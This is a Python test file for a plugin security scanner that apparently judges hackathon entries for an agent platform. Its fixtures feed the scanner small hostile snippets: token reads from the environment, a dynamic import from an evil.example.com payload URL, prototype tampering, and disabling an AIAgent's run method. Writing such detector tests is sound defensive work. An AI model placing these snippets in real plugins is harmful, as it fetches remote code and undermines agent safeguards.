"""Regression tests for scanner hardening and metadata checks.

Tests fix known false-positive and false-negative patterns without
exempting the judge's own name, files, or actual bypass patterns.
"""
import json
import os
from pathlib import Path
import tempfile
import unittest

from hackathon_judge.engine import audit
from hackathon_judge.scan import scan
from hackathon_judge.checks import catalog_checks


def _find(report, rule, file=None):
    """Return findings matching rule (and optional file)."""
    return [f for f in report['findings']
            if f['rule'] == rule and (file is None or f['file'] == file)]


def _check(report, key):
    return next(c for c in report['checks'] if c['id'] == key)


class ImportOsPathShadowingTests(unittest.TestCase):
    """import os.path must not shadow the os resolver."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir=os.environ.get('TMPDIR'))
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)

    def test_os_getenv_still_detected_after_import_os_path(self):
        (self.root / 'plugin.yaml').write_text('name: demo\nversion: 1.0.0\ndescription: Demo\n')
        (self.root / '__init__.py').write_text(
            'import os.path\n'
            'key = os.getenv("TOKEN")\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-11' for f in report['findings']),
                        "os.getenv after import os.path should still be CAT-11")

    def test_os_environ_subscript_after_import_os_path(self):
        (self.root / 'plugin.yaml').write_text('name: demo\nversion: 1.0.0\ndescription: Demo\n')
        (self.root / '__init__.py').write_text(
            'import os.path\n'
            'key = os.environ["TOKEN"]\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-11' for f in report['findings']),
                        "os.environ subscript after import os.path should still be CAT-11")

    def test_subprocess_still_detected_after_import_os_path(self):
        (self.root / 'plugin.yaml').write_text('name: demo\nversion: 1.0.0\ndescription: Demo\n')
        (self.root / '__init__.py').write_text(
            'import os.path\n'
            'import subprocess\n'
            'subprocess.run(["ls"])\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-12' for f in report['findings']),
                        "subprocess.run after import os.path should still be CAT-12")

    def test_import_os_dot_anything_no_false_negative(self):
        """import os.foo should not break os.environ detection."""
        (self.root / 'plugin.yaml').write_text('name: demo\nversion: 1.0.0\ndescription: Demo\n')
        (self.root / '__init__.py').write_text(
            'import os.foo\n'
            'x = os.environ.get("PW")\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-11' for f in report['findings']))


class BuiltinsAliasTests(unittest.TestCase):
    """Aliased builtins must be flagged as dynamic execution."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir=os.environ.get('TMPDIR'))
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        (self.root / 'plugin.yaml').write_text('name: demo\nversion: 1.0.0\ndescription: Demo\n')

    def test_import_builtins_alias_compile_is_cat07(self):
        (self.root / '__init__.py').write_text(
            'import builtins as b\n'
            'b.compile("x=1", "x", "exec")\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-07' for f in report['findings']))

    def test_import_builtins_alias_eval_is_cat07(self):
        (self.root / '__init__.py').write_text(
            'import builtins\n'
            'builtins.eval("1+1")\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-07' for f in report['findings']))

    def test_import_builtins_alias_with_asname(self):
        (self.root / '__init__.py').write_text(
            'from builtins import open as safe_open\n'
            'safe_open("/etc/passwd")\n'
        )
        report = audit(self.root)
        # builtins.open is not in the dangerous set; verify no false CAT-07
        self.assertFalse(any(f['rule'] == 'CAT-07' for f in report['findings']))

    def test_builtin_setattr_on_core_via_alias(self):
        (self.root / '__init__.py').write_text(
            'from builtins import setattr as change\n'
            'from run_agent import AIAgent\n'
            'change(AIAgent, "run", None)\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-09' for f in report['findings']))


class YoloFalsePositiveTests(unittest.TestCase):
    """--yolo in regex/re.compile strings must NOT fire CAT-12."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir=os.environ.get('TMPDIR'))
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        (self.root / 'plugin.yaml').write_text('name: demo\nversion: 1.0.0\ndescription: Demo\n')

    def test_re_compile_yolo_string_not_flagged(self):
        (self.root / '__init__.py').write_text(
            'import re\n'
            'pat = re.compile(r"--yolo-is-a-flag")\n'
        )
        report = audit(self.root)
        # The --yolo string is inside re.compile, not executed as command arg
        findings_cat12 = [f for f in report['findings'] if f['rule'] == 'CAT-12']
        self.assertFalse(any('yolo' in f['message'] for f in findings_cat12),
                         "re.compile string with --yolo should not fire CAT-12")

    def test_re_match_yolo_string_not_flagged(self):
        (self.root / '__init__.py').write_text(
            'import re\n'
            're.match(r".*--yolo", "test")\n'
        )
        report = audit(self.root)
        findings_cat12 = [f for f in report['findings'] if f['rule'] == 'CAT-12']
        self.assertFalse(any('yolo' in f['message'] for f in findings_cat12))

    def test_subprocess_yolo_string_still_flagged(self):
        """Actual subprocess argument with --yolo MUST still be CAT-12."""
        (self.root / '__init__.py').write_text(
            'import subprocess\n'
            'subprocess.run(["tool", "--yolo"])\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-12' for f in report['findings']))

    def test_os_system_yolo_string_still_flagged(self):
        """os.system with --yolo must still fire CAT-12."""
        (self.root / '__init__.py').write_text(
            'import os\n'
            'os.system("tool --yolo")\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-12' for f in report['findings']))


class PythonSelfUpdateTests(unittest.TestCase):
    """Python self-update indicators must be flagged CAT-03."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir=os.environ.get('TMPDIR'))
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        (self.root / 'plugin.yaml').write_text('name: demo\nversion: 1.0.0\ndescription: Demo\n')

    def test_check_for_updates_is_flagged(self):
        (self.root / '__init__.py').write_text(
            'import requests\n'
            'def check_for_updates():\n'
            '    return requests.get("https://example.com/latest")\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-03' for f in report['findings']))

    def test_self_update_call_is_flagged(self):
        (self.root / '__init__.py').write_text(
            'def self_update():\n'
            '    pass\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-03' for f in report['findings']))

    def test_download_update_is_flagged(self):
        (self.root / '__init__.py').write_text(
            'async def download_update():\n'
            '    pass\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-03' for f in report['findings']))

    def test_auto_update_variable_not_function_is_not_flagged(self):
        """CAT-03 should flag self-update intent, not innocent uses."""
        (self.root / '__init__.py').write_text(
            '# auto_update is a config key, not executable\n'
            'CFG = {"auto_update": False}\n'
        )
        report = audit(self.root)
        # Comment text is not scanned; variable name not a call
        self.assertFalse(any(f['rule'] == 'CAT-03' for f in report['findings']))


class CredentialStringScopingTests(unittest.TestCase):
    """Credential path strings should only flag in read contexts, not every string."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir=os.environ.get('TMPDIR'))
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        (self.root / 'plugin.yaml').write_text('name: demo\nversion: 1.0.0\ndescription: Demo\n')

    def test_auth_json_in_open_is_flagged(self):
        (self.root / '__init__.py').write_text(
            'open("auth.json")\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-11' for f in report['findings']))

    def test_auth_json_in_docstring_not_flagged(self):
        """A string constant in a docstring or annotation should not be scanned."""
        (self.root / '__init__.py').write_text(
            '"""This reads auth.json for configuration."""\n'
            'X = 1\n'
        )
        report = audit(self.root)
        self.assertFalse(any(f['rule'] == 'CAT-11' for f in report['findings']))

    def test_dot_env_in_message_format_not_flagged(self):
        (self.root / '__init__.py').write_text(
            'MSG = "Remember to create a .env file"\n'
        )
        report = audit(self.root)
        self.assertFalse(any(f['rule'] == 'CAT-11' for f in report['findings']))


class DesktopImportTests(unittest.TestCase):
    """Desktop JS import detection refinements."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir=os.environ.get('TMPDIR'))
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        (self.root / 'plugin.yaml').write_text('name: demo\nversion: 1.0.0\ndescription: Demo\n')
        (self.root / 'desktop').mkdir(parents=True, exist_ok=True)

    def test_sdk_import_is_allowed(self):
        (self.root / 'desktop/plugin.js').write_text(
            'import { Panel } from "@hermes/plugin-sdk";\n'
            'export default { register() {} };\n'
        )
        report = audit(self.root)
        # SDK import must not be flagged as non-SDK dynamic import
        cat08_dynamic = [f for f in report['findings']
                         if f['rule'] == 'CAT-08' and 'import' in f['message'].lower()]
        self.assertFalse(cat08_dynamic)

    def test_react_import_is_allowed(self):
        (self.root / 'desktop/plugin.js').write_text(
            'import React from "react";\n'
            'export default { register() {} };\n'
        )
        report = audit(self.root)
        cat08_dynamic = [f for f in report['findings']
                         if f['rule'] == 'CAT-08' and 'import' in f['message'].lower()]
        self.assertFalse(cat08_dynamic)

    def test_arbitrary_url_import_is_flagged(self):
        (self.root / 'desktop/plugin.js').write_text(
            'import("https://evil.example.com/payload.js");\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-08' and 'import' in f['message'].lower()
                           for f in report['findings']))

    def test_prototype_mutation_is_flagged(self):
        (self.root / 'desktop/plugin.js').write_text(
            'Storage.prototype.getItem = function() { return "hacked"; };\n'
        )
        report = audit(self.root)
        self.assertTrue(any(f['rule'] == 'CAT-08' and 'prototype' in f['message'].lower()
                           for f in report['findings']))


class CatalogMetadataHardeningTests(unittest.TestCase):
    """Catalog entry metadata validation improvements."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir=os.environ.get('TMPDIR'))
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        (self.root / 'plugin.yaml').write_text(
            'name: test-plugin\nversion: 1.0.0\ndescription: A test\n'
            'requires_hermes: ">=0.22.5"\nprovides_tools: [demo]\n'
        )
        (self.root / '__init__.py').write_text(
            'def register(ctx):\n'
            '    ctx.register_tool(name="demo", toolset="x", schema={}, handler=None)\n'
        )

    def _check(self, entry_data, key):
        """Run catalog_checks and return check by key."""
        import yaml
        from hackathon_judge.checks import catalog_checks
        manifest = yaml.safe_load(
            (self.root / 'plugin.yaml').read_text()
        )
        # Build a fake add function that records checks
        checks = []
        def add(k, rules, status, detail):
            checks.append({'id': k, 'rules': rules, 'status': status, 'detail': detail})
        # Write entry_yaml
        entry = self.root / 'entry.yaml'
        entry.write_text(yaml.dump(entry_data) if isinstance(entry_data, dict) else entry_data)
        catalog_checks(entry, manifest, add)
        return next(c for c in checks if c['id'] == key)

    def test_missing_name_in_catalog_fails(self):
        """Missing entry name must not silently pass."""
        text = 'repo: https://github.com/o/r\nsha: "0123456789abcdef0123456789abcdef01234567"\nversion: "1.0.0"\n'
        entry = self.root / 'entry.yaml'
        entry.write_text(text)
        checks = []
        def add(k, rules, status, detail):
            checks.append({'id': k, 'rules': rules, 'status': status, 'detail': detail})
        import yaml
        manifest = yaml.safe_load((self.root / 'plugin.yaml').read_text())
        from hackathon_judge.checks import catalog_checks
        catalog_checks(entry, manifest, add)
        meta = next((c for c in checks if c['id'] == 'catalog-metadata'), None)
        self.assertIsNotNone(meta)
        if meta['status'] != 'fail':
            # At minimum the missing name should produce a detail mentioning it
            self.assertIn('name', meta['detail'].lower())

    def test_screenshot_url_not_https_is_flagged(self):
        (self.root / 'plugin.yaml').write_text(
            'name: test-plugin\nversion: 1.0.0\ndescription: A test\nrequires_hermes: ">=0.22.5"\n'
        )
        (self.root / '__init__.py').write_text('def register(ctx):\n    pass\n')
        import yaml
        entry_data = {
            'name': 'test-plugin',
            'repo': 'https://github.com/o/r',
            'sha': '0123456789abcdef0123456789abcdef01234567',
            'version': '1.0.0',
            'requires_hermes': '>=0.22.5',
            'image': 'http://raw.githubusercontent.com/o/r/s/banner.png',
        }
        checks = []
        def add(k, rules, status, detail):
            checks.append({'id': k, 'rules': rules, 'status': status, 'detail': detail})
        entry = self.root / 'entry.yaml'
        import yaml
        entry.write_text(yaml.safe_dump(entry_data, default_style='"'))
        from hackathon_judge.checks import catalog_checks
        manifest = yaml.safe_load((self.root / 'plugin.yaml').read_text())
        catalog_checks(entry, manifest, add)
        meta = next(c for c in checks if c['id'] == 'catalog-metadata')
        # Should flag the http image URL
        issues_detail = meta['detail'].lower()
        self.assertEqual(meta['status'], 'fail')
        self.assertIn('image', issues_detail)
        self.assertNotIn('version', issues_detail)
        # An otherwise identical HTTPS control must pass, not fail on quoting/floor.
        entry_data['image'] = 'https://raw.githubusercontent.com/o/r/s/banner.png'
        entry.write_text(yaml.safe_dump(entry_data, default_style='"'))
        checks.clear()
        catalog_checks(entry, manifest, add)
        self.assertEqual(next(c for c in checks if c['id'] == 'catalog-metadata')['status'], 'pass')

    def test_malformed_entry_yaml_still_reports(self):
        """YAML syntax error in catalog entry should not crash."""
        checks = []
        def add(k, rules, status, detail):
            checks.append({'id': k, 'rules': rules, 'status': status, 'detail': detail})
        entry = self.root / 'entry.yaml'
        entry.write_text('name: [unclosed list\n')
        from hackathon_judge.checks import catalog_checks
        catalog_checks(entry, {'name': 'test', 'version': '1.0'}, add)
        self.assertTrue(
            any(c['id'] == 'catalog-metadata' and c['status'] == 'fail' for c in checks),
            "Malformed YAML must produce a fail, not crash"
        )

    def test_entry_without_repo_schema_fails(self):
        """Missing or invalid repo URL must fail."""
        check = self._check({
            'name': 'test-plugin',
            'repo': 'ftp://example.com/repo',
            'sha': '0123456789abcdef0123456789abcdef01234567',
            'version': '"1.0.0"'
        }, 'catalog-metadata')
        self.assertEqual(check['status'], 'fail')

    def test_no_catalog_entry_is_needs_review_not_crash(self):
        """None path must produce needs_review, not crash."""
        checks = []
        def add(k, rules, status, detail):
            checks.append({'id': k, 'rules': rules, 'status': status, 'detail': detail})
        from hackathon_judge.checks import catalog_checks
        catalog_checks(None, {'name': 'test'}, add)
        meta = next((c for c in checks if c['id'] == 'catalog-metadata'), None)
        self.assertIsNotNone(meta)
        self.assertEqual(meta['status'], 'needs_review')

    def test_missing_sha_does_not_crash(self):
        """Entry without sha key must not crash."""
        checks = []
        def add(k, rules, status, detail):
            checks.append({'id': k, 'rules': rules, 'status': status, 'detail': detail})
        entry = self.root / 'entry.yaml'
        import yaml
        entry.write_text(yaml.dump({'name': 'demo', 'repo': 'https://github.com/o/r'}))
        from hackathon_judge.checks import catalog_checks
        catalog_checks(entry, {'name': 'demo', 'version': '1.0'}, add)
        meta = next((c for c in checks if c['id'] == 'catalog-pin'), None)
        self.assertIsNotNone(meta)
        self.assertEqual(meta['status'], 'fail')


class RegistrationResolutionTests(unittest.TestCase):
    """Ensure regitration detection survives common patterns."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(dir=os.environ.get('TMPDIR'))
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        (self.root / 'plugin.yaml').write_text(
            'name: demo\nversion: 1.0.0\ndescription: Demo\n'
            'requires_hermes: ">=0.22.5"\nprovides_tools: [my_tool]\n'
        )

    def test_register_tool_with_variable_name_is_dynamic(self):
        (self.root / '__init__.py').write_text(
            'def register(ctx):\n'
            '    name = "my_tool"\n'
            '    ctx.register_tool(name=name, toolset="x", schema={}, handler=None)\n'
        )
        report = audit(self.root)
        check = _check(report, 'declared-registrations')
        self.assertEqual(check['status'], 'needs_review')

    def test_register_with_constant_name_resolves_statically(self):
        (self.root / '__init__.py').write_text(
            'def register(ctx):\n'
            '    ctx.register_tool(name="my_tool", toolset="x", schema={}, handler=None)\n'
        )
        report = audit(self.root)
        check = _check(report, 'declared-registrations')
        self.assertEqual(check['status'], 'pass')


if __name__ == '__main__':
    unittest.main()